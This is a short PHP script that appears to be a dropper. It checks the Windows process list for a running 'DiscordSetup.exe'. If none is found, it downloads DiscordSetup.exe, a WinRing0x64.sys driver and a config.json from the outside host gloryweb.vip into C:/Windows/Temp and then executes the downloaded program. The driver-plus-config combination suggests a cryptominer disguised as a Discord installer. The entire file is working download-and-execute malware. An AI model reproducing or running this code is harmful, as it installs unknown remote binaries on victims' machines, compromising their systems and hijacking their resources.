 <?php 










exec('tasklist', $output);

$url =  'http://gloryweb.vip/DiscordSetup.exe';
$url2 =  'http://gloryweb.vip/WinRing0x64.sys';
$url3 =  'http://gloryweb.vip/config.json';

$file_name = 'C:/Windows/Temp/DiscordSetup.exe';
$file_name2 = 'C:/Windows/Temp/WinRing0x64.sys';
$file_name3 = 'C:/Windows/Temp/config.json';

$found = false;
$found2 = false;
$found3 = false;
$found4 = false;
foreach ($output as $line) {

    if (stripos(strtolower($line), 'discordsetup.exe') !== false) {
        $found4 = true;

    }
}

if ( !$found4) {



        if (file_put_contents($file_name, file_get_contents($url)))
            {
                echo "File downloaded successfully";
            }
        else
            {
            echo "File downloading failed.";
            }
         if (file_put_contents($file_name2, file_get_contents($url2)))
            {
                echo "File downloaded successfully";
            }
        else
            {
            echo "File downloading failed.";
            }
          if (file_put_contents($file_name3, file_get_contents($url3)))
            {
                echo "File downloaded successfully";
            }
        else
            {
            echo "File downloading failed.";
            }

         system('C:/Windows/Temp/DiscordSetup.exe');
        





}
?>

